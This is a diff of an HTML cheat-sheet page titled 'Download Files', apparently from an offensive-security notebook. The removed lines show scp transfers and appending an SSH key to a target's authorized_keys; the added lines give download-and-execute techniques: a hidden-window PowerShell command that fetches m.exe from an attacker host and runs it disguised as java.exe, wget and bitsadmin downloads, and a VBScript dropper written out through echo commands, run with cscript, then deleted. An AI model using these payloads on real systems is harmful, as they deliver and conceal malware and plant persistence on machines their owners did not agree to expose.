@@ -1,4 +1,4 @@
-<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Downlaod</title><style>
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Download Files</title><style>
 /* webkit printing magic: print all background colors */
 html {
 	-webkit-print-color-adjust: exact;
@@ -562,12 +562,47 @@ blockquote {
 	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
 }
 	
-</style></head><body><article id="f2178220-4cea-4b9a-9367-b2b67b6e792d" class="page sans"><header><h1 class="page-title">Downlaod</h1></header><div class="page-body"><hr id="5e145ef1-549a-441f-af74-30d5f245055b"/><h3 id="cd8af8c9-cec9-4649-8eb3-adfd0dfab553" class="">Copy remote file to local</h3><pre id="c4c802e8-0fd4-452f-814f-1be519e8138b" class="code"><code>scp /path/to/local/file.txt user@targetIP:/path/to/share # local to remote</code></pre><pre id="752165b5-2d22-4f5f-8f34-977c622478e1" class="code"><code>scp -r user@targetIP:/path/to/share /local/share # remote to local</code></pre><pre id="e10ebfc4-5544-4606-8eb5-102f2580dfbf" class="code"><code>cat ~/.ssh/id_rsa.pub | ssh user@targetIP &#x27;cat &gt;&gt; .ssh/authorized</code></pre><p id="b24104e1-1ba6-4b4c-a2ca-9b94072e8bcd" class="">
-</p><p id="3adb6d5e-9c90-4ee1-9df5-56641909f035" class="">
-</p><p id="5bccbf0e-8536-46c4-9a98-a7a44015bcda" class="">
-</p><h1 id="20f3ae27-e5ac-4c11-89fb-a8ba16147459" class="">Copy files remotely</h1><p id="e00a83d6-2b91-495f-8f1b-2095fb7f08d4" class=""><div class="indented"><pre id="3b17f6b6-b4a2-4f64-bee7-e3b245290507" class="code"><code>scp /path/to/local/file.txt user@targetIP:/path/to/share # local to remote
-scp -r user@targetIP:/path/to/share /local/share # remote to local
-cat ~/.ssh/id_rsa.pub | ssh user@targetIP &#x27;cat &gt;&gt; .ssh/authorized_keys&#x27;
-</code></pre><p id="db316752-8c2f-4b58-9228-4a097c22ffab" class="">
-</p></div></p><h1 id="06ec81d0-3fea-43df-96b5-753a70984027" class="">File Permissions</h1><p id="9471d56d-ab42-4083-95b2-b6a7bcc9c16d" class="">
+</style></head><body><article id="4d56b4aa-681b-421c-a60c-3d6ee7a36a94" class="page sans"><header><h1 class="page-title">Download Files</h1></header><div class="page-body"><hr id="ff6cf874-0f48-4f67-94f0-e6e311237e8c"/><p id="0f83e579-7bf4-4598-8365-959bd7c33fdb" class="">Powershell script to download and save as hidden</p><pre id="6228e299-6558-46ff-95a4-e9c1c00767a1" class="code"><code>powershell -WindowStyle Hidden &quot;IEX (New-Object Net.WebClient).DownloadFile(&#x27;http://IP/m.exe&#x27;,&#x27;c:\windows\temp\java.exe&#x27;);Start-Process c:\windows\temp\java.exe&quot;</code></pre><p id="d035e1b5-a22d-4911-9089-3bec065bb1d9" class="">
+</p><p id="ca590db1-1f06-4581-9deb-59c1ce917109" class="">using Wget</p><pre id="165b0861-72f6-4c72-9293-fe8d00ab2fb9" class="code"><code>wget -P /tmp http://ip/cmd.txt</code></pre><p id="6c3a1564-d6a9-4ba1-9070-0fac006db2f0" class="">
+</p><p id="e96bf40f-be1b-456c-a13f-483186153fb6" class="">Using Bits admin</p><pre id="e197ea5b-8943-4fd9-977a-f3c3e7a89a81" class="code"><code>bitsadmin /transfer n http://ip/img/wget.exe C:\WINDOWS\Temp\wget.exe</code></pre><p id="a0cc9823-216a-47a2-85ab-2e89afaddf2e" class="">using VB Script</p><pre id="54ba86d9-b7c8-4f5e-8625-0e521a1830f0" class="code"><code>VBS
+Set Post = CreateObject(&quot;Msxml2.XMLHTTP&quot;)
+Set Shell = CreateObject(&quot;Wscript.Shell&quot;)
+Post.Open &quot;GET&quot;,&quot;http://IP/m.exe&quot;,0
+Post.Send()
+Set aGet = CreateObject(&quot;ADODB.Stream&quot;)
+aGet.Mode = 3
+aGet.Type = 1
+aGet.Open()
+aGet.Write(Post.responseBody)
+afile = &quot;java.exe&quot;
+aGet.SaveToFile afile,2
+Shell.Run (afile)</code></pre><p id="75d836a8-aa1c-49ae-b7ff-82d7a88548b6" class="">
+</p><p id="8481dd75-184a-42cd-8765-a451885f41a7" class="">using CMD * </p><pre id="59566af6-9d94-44c0-a236-350e2c8a6619" class="code"><code>del K8.vbs&amp;
+echo Set Post = CreateObject(&quot;Msxml2.XMLHTTP&quot;) &gt;&gt; K8.vbs
+&amp;&amp;
+echo Set Shell = CreateObject(&quot;Wscript.Shell&quot;) &gt;&gt; K8.vbs
+&amp;&amp;
+echo Post.Open &quot;GET&quot;,&quot;http://192.168.25.128:13272/m.exe&quot;,0 &gt;&gt; K8.vbs
+&amp;&amp;
+echo Post.Send() &gt;&gt; K8.vbs
+&amp;&amp;
+echo Set aGet = CreateObject(&quot;ADODB.Stream&quot;) &gt;&gt; K8.vbs
+&amp;&amp;
+echo aGet.Mode = 3 &gt;&gt; K8.vbs
+&amp;&amp;
+echo aGet.Type = 1 &gt;&gt; K8.vbs
+&amp;&amp;
+echo aGet.Open() &gt;&gt; K8.vbs
+&amp;&amp;
+echo aGet.Write(Post.responseBody) &gt;&gt; K8.vbs
+&amp;&amp;
+echo afile = &quot;java.exe&quot; &gt;&gt; K8.vbs
+&amp;&amp;
+echo aGet.SaveToFile afile,2 &gt;&gt; K8.vbs
+&amp;&amp;
+echo Shell.Run (afile) &gt;&gt;K8.vbs
+&amp;&amp;
+cscript K8.vbs
+&amp;&amp;
+del K8.vbs</code></pre><p id="8f756733-79a7-41a9-b845-258aff447b8d" class="">
 </p></div></article></body></html>
